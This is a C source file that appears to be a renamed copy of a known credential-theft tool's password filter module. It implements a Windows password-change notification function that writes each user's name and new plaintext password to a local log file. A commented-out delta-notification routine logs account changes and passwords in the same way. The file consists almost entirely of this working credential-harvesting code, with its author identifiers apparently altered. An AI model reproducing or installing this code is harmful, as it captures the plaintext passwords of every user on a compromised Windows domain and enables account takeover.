/*	paparas DELPY `gamidiaaktinidio`
	http://blog.gamidiaaktinidio.com
	paparas@gamidiaaktinidio.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kfilt.h"

BOOLEAN NTAPI kfilt_InitializeChangeNotify(void)
{
	return TRUE;
}

NTSTATUS NTAPI kfilt_PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword)
{
	FILE * kfilt_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kfilt_logfile = _wfopen(L"aktinidiofilter.log", L"a"))
#pragma warning(pop)
	{
		klog(kfilt_logfile, L"[%08x] %wZ\t", RelativeId, UserName);
		klog_password(kfilt_logfile, NewPassword);
		klog(kfilt_logfile, L"\n");
		fclose(kfilt_logfile);
	}
	return STATUS_SUCCESS;
}

//// in .def: DeltaNotify				=	kfilt_DeltaNotify
//PCWCHAR kfilt_DeltaNotify_Operation[] = {L"CreateInDomain", L"SetInformation_a", L"Delete", L"AddMember", L"unknown5", L"RemoveMember", L"SetInformation_b", L"Password"},
//		kfilt_DeltaNotify_Category[] = {L"Domain", L"User", L"Group", L"Alias"};
//NTSTATUS NTAPI kfilt_DeltaNotify(PSID pSid, DELTA_OPERATION_TYPE operation, DELTA_CATEGORY_TYPE category, ULONG RelativeId, PDELTA_OPERATION_DATA dedomena5, PDWORD a6, PDELTA_OPERATION_DATA dedomena7)
//{
//	FILE * kfilt_logfile;
//#pragma warning(push)
//#pragma warning(disable:4996)
//	if(kfilt_logfile = _wfopen(L"aktinidiofilter2.log", L"a"))
//#pragma warning(pop)
//	{
//		klog(kfilt_logfile, L"%s->%s @ ", (category >= DeltaCategoryDomain && category <= DeltaCategoryAlias) ? kfilt_DeltaNotify_Category[category - 1] : L"?", (operation >= DeltaOperationCreateInDomain && operation <= DeltaOperationPassword) ? kfilt_DeltaNotify_Operation[operation - 1] : L"?");
//		klog_sid(kfilt_logfile, pSid);
//		klog(kfilt_logfile, L"-%u (0x%x, ct @ %p = %u)\n", RelativeId, RelativeId, a6, *a6);
//
//		klog(kfilt_logfile, L"\t{ dedomena5 @ %p - dedomena7 @ %p }\n", dedomena5, dedomena7);
//		// DeltaOperationCreateInDomain
//		if(dedomena5)
//		{
//			switch(operation)
//			{
//			case DeltaOperationDelete:
//				klog(kfilt_logfile, L"\tName: %wZ\n", &dedomena5->opDelete.Name);
//				break;
//			default:
//				;
//			}
//		}
//		
//		if(dedomena7)
//		{
//			switch(operation)
//			{
//			case DeltaOperationAddMemberTo:
//			case DeltaOperationRemoveMemberFrom:
//				klog(kfilt_logfile, L"\t@ ");
//				klog_sid(kfilt_logfile, dedomena7->opMember.pSid);
//				klog(kfilt_logfile, L"\n");
//				break;
//			case DeltaOperationPassword:
//				if(category == DeltaCategoryUser)
//				{
//					klog(kfilt_logfile, L"\tUserName: %wZ\n\tPassword: ", &dedomena7->opPassword.UserName);
//					klog_password(kfilt_logfile, &dedomena7->opPassword.Password);
//					klog(kfilt_logfile, L"\n");
//				}
//				break;
//			case DeltaOperationSetInformation_b:
//			default:
//				;
//			}
//		}
//		//klog(kfilt_logfile, L"\t{ dedomena5 @ %p - a6 @ %p - dedomena7 @ %p }\n", dedomena5, a6, dedomena7);
//		fclose(kfilt_logfile);
//	}
//	return STATUS_SUCCESS;
//}